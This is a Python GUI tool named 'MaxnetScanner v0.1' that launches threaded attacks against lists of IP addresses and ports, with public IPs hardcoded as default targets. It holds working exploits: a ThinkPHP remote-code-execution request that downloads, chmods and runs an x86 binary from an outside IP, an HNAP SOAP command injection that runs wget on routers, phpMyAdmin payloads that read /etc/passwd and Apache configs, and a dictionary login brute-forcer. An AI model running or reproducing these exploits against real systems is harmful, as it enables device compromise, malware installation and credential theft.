import threading, socket, re, requests
import tkinter as tk
import ipaddress as ipa
from tkinter import ttk, messagebox
from languages import LOCALIZED_STRINGS as lng
import urllib.request
import urllib.error

LG = "RU"

ip_list = ['208.124.233.229', '192.168.87.1',
           '103.21.244.7',
           '50.218.57.69',
           '46.22.241.106',
           '195.135.242.141']

port_list = ['80', '8080', '8081', '1080']
scan_results_l = []
main_buttons_width = 27
main_buttons_height = 6
main_buttons_font_size = 12
main_wnd = None
langs = list(lng.keys())
scan_sets = [0 for i in range(7)]
progress = None
operations = 0
step = 0
hnap_timer = 1


# --------------------------proxym----------------
def progr_add():
    global progress, scan_results_l
    progress['value'] = (len(scan_results_l) / (operations * sum(scan_sets))) * 100


class proxy_pump(threading.Thread):
    global progress, step, scan_results_l, hnap_timer

    def __init__(self, ip):
        threading.Thread.__init__(self)
        self.ip = str(ip).rstrip('\n')

    def run(self):
        addr = self.ip.split(':')
        try:
            proxy_handler = urllib.request.ProxyHandler({'http': self.ip})
            opener = urllib.request.build_opener(proxy_handler)
            opener.addheaders = [('User-agent', 'Mozilla/5.0')]
            urllib.request.install_opener(opener)
            req = urllib.request.Request('http://www.google.com')
            sock = urllib.request.urlopen(req)
        except urllib.error.HTTPError as e:
            print('Error code: ', e.code)
            scan_results_l.append((addr[0], addr[1], lng[LG][23], 'Connection error'))
            progr_add()
            return e.code
        except Exception as detail:
            print("Bad Proxy %s\n" % (self.ip))
            scan_results_l.append((addr[0], addr[1], lng[LG][23], 'Not proxy server'))
            progr_add()
            return 1
        print("%s is working\n" % (self.ip))
        scan_results_l.append((addr[0], addr[1], lng[LG][22], 'Proxy server'))
        progr_add()
        return 0


def proxy_scan(proxyList=[]):
    socket.setdefaulttimeout(250)

    for currentProxy in proxyList:
        n = proxy_pump(currentProxy)
        n.start()


# --------------------HNAP1------------------------

payload = "<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><AddPortMapping xmlns=\"http://purenetworks.com/HNAP1/\"><PortMappingDescription>foobar</PortMappingDescription><InternalClient>192.168.0.100</InternalClient><PortMappingProtocol>TCP</PortMappingProtocol><ExternalPort>1234</ExternalPort><InternalPort>1234</InternalPort></AddPortMapping></soap:Body></soap:Envelope>"
headerlist = {
    'SOAPAction': 'http://purenetworks.com/HNAP1/GetDeviceSettings/`cd /tmp && wget https://i.ytimg.com/vi/qpnvqpug56A/maxresdefault.jpg -O-`'}


class hnap_pump(threading.Thread):

    def __init__(self, ip):

        threading.Thread.__init__(self)
        self.ip = str(ip)

    def run(self):
        addr = self.ip.split(':')
        url = "http://" + self.ip + "/HNAP1"
        url = re.sub('\n', '', url)
        try:
            r = requests.get(url, timeout=hnap_timer, allow_redirects=False)
            q = requests.post(url, timeout=hnap_timer, headers=headerlist, data=payload, allow_redirects=False)
            if len(r.history) > 1:
                progr_add()
                raise ValueError
            if len(q.history) > 1:
                progr_add()
                raise ValueError
                return 0
            if 'HNAPExt' in r.text:
                print(2)
                scan_results_l.append((addr[0], addr[1], lng[LG][22], 'HNAP Extended instructions'))
            elif 'HNAP1' in r.text:
                print(1)
                scan_results_l.append((addr[0], addr[1], lng[LG][22], 'HNAP Base instructions'))
            elif q.status_code == 200:
                scan_results_l.append((addr[0], addr[1], lng[LG][22], 'HNAP attack completed'))
            progr_add()
        except:
            scan_results_l.append((addr[0], addr[1], lng[LG][23], 'No HNAP'))
            progr_add()


def hnap_scan(ips):
    for ip in ips:
        try:
            n = hnap_pump(ip)
            n.start()
        except:
            pass


# --------------------ThinkPHP----------------------

class ThinkPHP_pump(threading.Thread):

    def __init__(self, ip):

        threading.Thread.__init__(self)
        self.ip = str(ip)

    def run(self):
        addr = self.ip.split(':')
        url = "http://" + self.ip
        url = re.sub('\n', '', url)
        s = [
            "/index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://104.239.170.93/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp",
            "/index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP"
            ]
        try:
            r = requests.get(url + s[0], timeout=hnap_timer, allow_redirects=False)
            if r.status_code == 200:
                scan_results_l.append((addr[0], addr[1], lng[LG][22], 'ThinkPHP'))
                progr_add()
            else:
                r = requests.get(url + s[1], timeout=hnap_timer, allow_redirects=False)
                if r.status_code == 200:
                    scan_results_l.append((addr[0], addr[1], lng[LG][22], 'ThinkPHP'))
                    progr_add()
        except:
            scan_results_l.append((addr[0], addr[1], lng[LG][23], 'No ThinkPHP'))
            progr_add()


def ThinkPHP_scan(ips):
    for ip in ips:
        try:
            n = ThinkPHP_pump(ip)
            n.start()
        except:
            pass


# ---------------phpMyAdmin--------------------

class MyAdmin_pump(threading.Thread):

    def __init__(self, ip):

        threading.Thread.__init__(self)
        self.ip = str(ip)

    def run(self):
        addr = self.ip.split(':')
        url = "http://" + self.ip
        url = re.sub('\n', '', url)
        s = [
            '/phpmyadmin/tbl_copy.php?db=test&table=haxor&new_name=test.haxor2&strCopyTableOK=".passthru(\'cat%20/etc/passwd\')."',
            '/phpmyadmin/server_privileges.php?server=1&hostname=\'&username=1&dbname=1&tablename=1',
            '/phpMyAdmin/css/phpmyadmin.css.php?GLOBALS[cfg][ThemePath]=/etc/passwd%00&theme=passwd%00',
            '/phpMyAdmin/css/phpmyadmin.css.php?GLOBALS[cfg][ThemePath]=/etc&theme=passwd%00',
            '/phpMyAdmin/libraries/database_interface.lib.php?cfg[Server][extension]=cXIb8O3',
            '/phpMyAdmin/sql.php?goto=/etc/apache/conf/httpd.conf&btnDrop=No',
            '/phpMyAdmin/sql.php?goto=/etc/apache/conf/srm.conf&btnDrop=No'
            ]
        try:
            for rght in s:
                r = requests.get(url + rght, timeout=hnap_timer, allow_redirects=False)
                print(r.url)
                if len(r.history) > 1:
                    progr_add()
                    raise ValueError
                print(r.text)
                if r.status_code == 200:
                    scan_results_l.append((addr[0], addr[1], lng[LG][22], 'phpMyAdmin'))
                    progr_add()
                    return 0
        except:
            scan_results_l.append((addr[0], addr[1], lng[LG][23], 'No phpMyAdmin'))
            progr_add()


def MyAdmin_scan(ips):
    for ip in ips:
        try:
            n = MyAdmin_pump(ip)
            n.start()
        except:
            pass


# ---------------BruteForce--------------------

class BruteForce_pump(threading.Thread):

    def __init__(self, pack):

        threading.Thread.__init__(self)
        self.ip = str(pack[0])

        if '<empty>' not in pack[1]:
            self.login = pack[1]
        else:
            self.login = ''

        if '<empty>' not in pack[2]:
            self.password = pack[2]
        else:
            self.password = ''

    def run(self):
        print(self.login)
        addr = self.ip.split(':')
        url = "http://" + self.ip
        url = re.sub('\n', '', url)
        s = ['/',
             '/login',
             '/auth',
             '/index.php'
             ]
        try:
            for rght in s:
                r = requests.post(url + rght, timeout=hnap_timer, headers={'User-agent': 'Mozilla/5.0'},
                                  data={'login': self.login, 'name': self.login, 'password': self.password})
                print(r.url)
                if len(r.history) > 1:
                    raise ValueError
                print(r.text)
                if r.status_code == 200:
                    scan_results_l.append((addr[0], addr[1], lng[LG][22],
                                           'Successfully loged with {}:{}'.format(self.login, self.password)))
                    progr_add()
                    return 0
                else:
                    raise ValueError
        except:
            scan_results_l.append((addr[0], addr[1], lng[LG][23], 'Bruteforce failed'))
            progr_add()


def BruteForce_scan(ips):
    dict_file = open('dict.txt', 'r')
    dict_data = dict_file.readlines()
    auth_data = [i.rstrip('\n').split('\t') for i in dict_data if '\t' in i]

    for ip in ips:
        for pass_data in auth_data:
            try:
                login = pass_data[0]
                password = pass_data[1]
                pack = [ip, login, password]
                n = BruteForce_pump(pack)
                n.start()
            except:
                pass


# ---------------HJS--------------------

class HJS_pump(threading.Thread):

    def __init__(self, ip):

        threading.Thread.__init__(self)
        self.ip = str(ip)

    def run(self):
        addr = self.ip.split(':')
        url = "http://" + self.ip
        url = re.sub('\n', '', url)
        s = ['/servlet/com.newatlanta.ServletExec.JSP10Servlet/defaut.JSP']
        try:
            for rght in s:
                r = requests.get(url + rght, timeout=hnap_timer, allow_redirects=False)
                print(r.url)
                if len(r.history) > 1:
                    progr_add()
                    raise ValueError
                print(r.text)
                if r.status_code == 200:
                    scan_results_l.append((addr[0], addr[1], lng[LG][22], 'unsafe HJS'))
                    progr_add()
                    return 0
        except:
            scan_results_l.append((addr[0], addr[1], lng[LG][23], 'No HJS'))
            progr_add()


def HJS_scan(ips):
    for ip in ips:
        try:
            n = HJS_pump(ip)
            n.start()
        except:
            pass


# ---------------SQLiteManager--------------------

class SQLite_pump(threading.Thread):

    def __init__(self, ip):

        threading.Thread.__init__(self)
        self.ip = str(ip)

    def run(self):
        addr = self.ip.split(':')
        url = "http://" + self.ip
        url = re.sub('\n', '', url)
        s = ['/lib/tpl.inc.php?conf[classpath]=[URL-OF-SCRIPT]']
        try:
            for rght in s:
                r = requests.get(url + rght, timeout=hnap_timer, allow_redirects=False)
                print(r.url)
                if len(r.history) > 1:
                    progr_add()
                    raise ValueError
                print(r.text)
                if r.status_code == 200:
                    scan_results_l.append((addr[0], addr[1], lng[LG][22], 'unsafe SQLite Manager'))
                    progr_add()
                    return 0
        except:
            scan_results_l.append((addr[0], addr[1], lng[LG][23], 'No SQLite Manager'))
            progr_add()


def SQLite_scan(ips):
    for ip in ips:
        try:
            n = SQLite_pump(ip)
            n.start()
        except:
            pass


# ---------------------------------------------------

def scan_sets_ind(ind, val):
    scan_sets[ind] = val


def is_port_valid(val, command):
    try:
        if val.isdigit():
            if int(val) >= 0 and int(val) < 65536:
                return command(val)
            else:
                raise (ValueError, 'Invalid port number!')
        else:
            raise (ValueError, 'Invalid port number!')
    except:
        messagebox.showerror(lng[LG][9], lng[LG][20])


def is_ip_valid(val, command):
    try:
        if '/' in val:
            ipa.ip_network(val)
        else:
            ipa.ip_address(val)
        return command(val)
    except ValueError:
        messagebox.showerror(lng[LG][8], lng[LG][19])


def value_input_wnd(wnd_title, msg, command=None, valid_rule_func=None):
    global LG
    window = tk.Tk()
    window.geometry('420x150+200+100')
    window.title(wnd_title)

    is_input_valid = valid_rule_func
    value = tk.StringVar(window)
    value.set('')

    input_label = tk.Label(
        window,
        borderwidth=0,
        relief=tk.RIDGE,
        font=("Courier", 10),
        text=msg,
        width=1,
        height=3
    )
    input_label.place(
        x=10,
        y=10,
        width=405
    )

    InputBox = tk.Entry(
        window,
        textvariable=value
    )
    InputBox.place(
        x=5,
        y=80,
        width=410
    )

    AcceptBut = ttk.Button(
        window,
        text='OK',
        command=lambda: [is_input_valid(value.get(), command), window.destroy()],
    )
    AcceptBut.place(
        x=185,
        y=110,
        width=50
    )


def refresh_ip_port(event, ip_range, port_range):
    global ip_list, port_list
    network_extender = []
    ip_list = [[network_extender.extend([str(e) for e in ipa.ip_network(i)]), i][1] if "/" in i else i for i in
               ip_range]
    ip_list.extend(network_extender)
    for i in range(len(ip_list) - 1):
        if "/" in ip_list[i]:
            ip_list.pop(i)
    port_list = [i for i in port_range]


def scan_settings():
    global LG, ip_list, port_list
    window = tk.Tk()
    window.geometry('275x240+200+100')
    window.title(lng[LG][2])

    ipr_label = tk.Label(
        window,
        borderwidth=0,
        relief=tk.RIDGE,
        font=("Courier", 10),
        text=lng[LG][13],
        width=15,
        height=1
    )
    ipr_label.place(
        x=25,
        y=0
    )
    port_label = tk.Label(
        window,
        borderwidth=0,
        relief=tk.RIDGE,
        font=("Courier", 10),
        text=lng[LG][18],
        width=10,
        height=1
    )
    port_label.place(
        x=170,
        y=0
    )

    ip_range = tk.Listbox(window)
    ip_range.place(
        x=25,
        y=20
    )

    port_range = tk.Listbox(
        window,
        width=10
    )
    port_range.place(
        x=180,
        y=20
    )

    for i in ip_list:
        ip_range.insert(tk.END, i)
    for i in port_list:
        port_range.insert(tk.END, i)

    ip_add = ttk.Button(
        window,
        text='+',
        command=lambda: value_input_wnd(
            lng[LG][14],
            lng[LG][15],
            lambda val: ip_range.insert(tk.END, val),
            is_ip_valid
        )
    )
    ip_add.place(
        x=25,
        y=182,
        width=62
    )

    ip_del = ttk.Button(
        window,
        text='-',
        command=lambda: [ip_range.delete(i) for i in ip_range.curselection()]
    )
    ip_del.place(
        x=87,
        y=182,
        width=62
    )

    port_add = ttk.Button(
        window,
        text='+',
        command=lambda: value_input_wnd(
            lng[LG][16],
            lng[LG][17],
            lambda val: port_range.insert(tk.END, val),
            is_port_valid
        )
    )
    port_add.place(
        x=180,
        y=182,
        width=32
    )

    port_del = ttk.Button(
        window,
        text='-',
        command=lambda: [port_range.delete(i) for i in port_range.curselection()]
    )
    port_del.place(
        x=212,
        y=182,
        width=32
    )
    window.bind('<Motion>', lambda event: refresh_ip_port(event, ip_range.get(0, tk.END), port_range.get(0, tk.END)))


def scan_modules():
    global LG, scan_sets
    window = tk.Tk()
    window.geometry('300x200+100+50')
    window.title(lng[LG][3])
    var = [tk.IntVar(window) for i in range(7)]
    for v in var:
        v.set(0)

    c1 = tk.Checkbutton(
        window,
        text=lng[LG][12],
        variable=var[0],
        font=(
            "Courier",
            main_buttons_font_size
        ),
        onvalue=1,
        offvalue=0,
        command=lambda: scan_sets_ind(0, var[0].get())
    )
    c1.pack(anchor=tk.W)

    if scan_sets[0] == 1:
        c1.select()

    c2 = tk.Checkbutton(
        window,
        text="HNAP v1.0",
        variable=var[1],
        font=(
            "Courier",
            main_buttons_font_size
        ),
        onvalue=1,
        offvalue=0,
        command=lambda: scan_sets_ind(1, var[1].get())
    )

    c2.pack(anchor=tk.W)

    if scan_sets[1] == 1:
        c2.select()

    c3 = tk.Checkbutton(
        window,
        text="SQLite Manager",
        variable=var[2],
        font=(
            "Courier",
            main_buttons_font_size
        ),
        onvalue=1,
        offvalue=0,
        command=lambda: scan_sets_ind(2, var[2].get())
    )
    c3.pack(anchor=tk.W)

    if scan_sets[2] == 1:
        c3.select()

    c4 = tk.Checkbutton(
        window,
        text="PHP my admin",
        variable=var[3],
        font=(
            "Courier",
            main_buttons_font_size
        ),
        onvalue=1,
        offvalue=0,
        command=lambda: scan_sets_ind(3, var[3].get())
    )
    c4.pack(anchor=tk.W)

    if scan_sets[3] == 1:
        c4.select()

    c5 = tk.Checkbutton(
        window,
        text="ThinkPHP",
        variable=var[4],
        font=(
            "Courier",
            main_buttons_font_size
        ),
        onvalue=1,
        offvalue=0,
        command=lambda: scan_sets_ind(4, var[4].get())
    )
    c5.pack(anchor=tk.W)

    if scan_sets[4] == 1:
        c5.select()

    c6 = tk.Checkbutton(
        window,
        text="Hudson Java Servlet",
        variable=var[5],
        font=(
            "Courier",
            main_buttons_font_size
        ),
        onvalue=1,
        offvalue=0,
        command=lambda: scan_sets_ind(5, var[5].get())
    )
    c6.pack(anchor=tk.W)

    if scan_sets[5] == 1:
        c6.select()

    c7 = tk.Checkbutton(
        window,
        text="Detect proxy servers",
        variable=var[6],
        font=(
            "Courier",
            main_buttons_font_size
        ),
        onvalue=1,
        offvalue=0,
        command=lambda: scan_sets_ind(6, var[6].get())
    )
    c7.pack(anchor=tk.W)

    if scan_sets[6] == 1:
        c7.select()


def scan_results():
    global LG, scan_results
    window = tk.Tk()
    window.geometry('600x400+200+100')
    window.title(lng[LG][4])

    result_tab = ttk.Treeview(window, height=20)
    result_tab['columns'] = (
        'ip_address',
        'port',
        'status',
        'comments'
    )

    result_tab.column(
        '#0',
        anchor=tk.CENTER,
        width=0,
        stretch=tk.NO
    )

    result_tab.column(
        'ip_address',
        anchor=tk.CENTER,
        width=150
    )

    result_tab.column(
        'port',
        anchor=tk.CENTER,
        width=150
    )

    result_tab.column(
        'status',
        anchor=tk.CENTER,
        width=150
    )

    result_tab.column(
        'comments',
        anchor=tk.CENTER,
        width=150
    )

    result_tab.heading(
        "ip_address",
        text=lng[LG][8],
        anchor=tk.CENTER
    )

    result_tab.heading(
        "port",
        text=lng[LG][9],
        anchor=tk.CENTER
    )

    result_tab.heading(
        "status",
        text=lng[LG][10],
        anchor=tk.CENTER
    )

    result_tab.heading(
        "comments",
        text=lng[LG][11],
        anchor=tk.CENTER
    )
    iid = 0
    for values in scan_results_l:
        if values[2] != lng[LG][23] or True:
            result_tab.insert(parent='',
                              index='end',
                              iid=iid,
                              text='',
                              values=values
                              )
        iid += 1

    result_tab.pack()


def language_change(i):
    global LG, langs
    LG = langs[i]
    main_wnd.destroy()
    return main_window()


def language_settings():
    global LG, langs
    window = tk.Tk()
    window.geometry('150x50+50+25')
    window.title(lng[LG][5])
    var = tk.IntVar(window)
    ind = langs.index(LG)
    var.set(ind)
    print('lng', langs)
    tmp = tk.Radiobutton(window,
                         text='Русский',
                         value=0,
                         variable=var,
                         command=lambda: language_change(0)
                         )
    tmp2 = tk.Radiobutton(window,
                          text='English',
                          value=1,
                          variable=var,
                          command=lambda: language_change(1)
                          )
    tmp.pack()
    tmp2.pack()

    if ind == 0:
        tmp.invoke()
    elif ind == 1:
        tmp2.invoke()


def scan_window():
    global LG, progress, step, completed, operations, scan_results_l

    window = tk.Tk()
    main_wnd = window
    window.geometry('300x200+200+100')
    window.title(lng[LG][21])

    scan_results_l = []

    progress = ttk.Progressbar(window, orient=tk.HORIZONTAL, length=200, mode='determinate')
    progress.place(x=50, y=80)
    ip_big_list = []

    for ip in ip_list:
        for port in port_list:
            ip_big_list.append(ip + ':' + port)
    print(ip_big_list)
    operations = len(ip_big_list)
    step = int((sum(scan_sets) / operations) * 100)
    print(step)
    progress['value'] = step

    if scan_sets[0] == 1:
        BruteForce_scan(ip_big_list)

    if scan_sets[1] == 1:
        hnap_scan(ip_big_list)

    if scan_sets[2] == 1:
        SQLite_scan(ip_big_list)

    if scan_sets[3] == 1:
        MyAdmin_scan(ip_big_list)

    if scan_sets[4] == 1:
        ThinkPHP_scan(ip_big_list)

    if scan_sets[5] == 1:
        HJS_scan(ip_big_list)

    if scan_sets[6] == 1:
        proxy_scan(ip_big_list)


def main_window():
    global LG, main_wnd
    print('Язык:', LG)
    window = tk.Tk()
    main_wnd = window
    window.geometry('600x400+200+100')
    window.title('MaxnetScanner v0.1')

    style = ttk.Style(window)

    style.configure('TButton', font=("Courier", 14))

    # ---------Верхний заголовок главного меню----------

    label_set = tk.Label(
        borderwidth=1,
        relief=tk.RIDGE,
        font=("Courier", 14),
        text=lng[LG][0],
        width=51,
        height=2
    )
    label_set.place(x=20, y=0)

    # -----------Пункт настройки сканирования-----------

    button_scan_settings = ttk.Button(
        text=lng[LG][2],
        command=scan_settings
    )
    button_scan_settings.place(x=20, y=50, width=main_buttons_width * 10.4, height=main_buttons_height * 22)

    # ---------Пункт выбора модулей сканирования--------

    button_scan_modules = ttk.Button(
        text=lng[LG][3],
        command=scan_modules
    )
    button_scan_modules.place(x=305, y=50, width=main_buttons_width * 10.4, height=main_buttons_height * 22)

    # ------Пункт просмтора результатов сканирования-----

    button_scan_results = ttk.Button(
        text=lng[LG][4],
        command=scan_results
    )
    button_scan_results.place(x=20, y=185, width=main_buttons_width * 10.4, height=main_buttons_height * 22)

    # ----------------Пункт смены языка------------------

    button_language_settings = ttk.Button(
        text=lng[LG][5],
        command=language_settings
    )
    button_language_settings.place(x=305, y=185, width=main_buttons_width * 10.4, height=main_buttons_height * 22)

    # ----------------Запуск сканирования----------------

    style.configure('TButton', font=("Courier", 12))

    button_scan = ttk.Button(
        text=lng[LG][1],
        command=scan_window
    )
    button_scan.place(x=180, y=350)

    window.mainloop()


main_window()
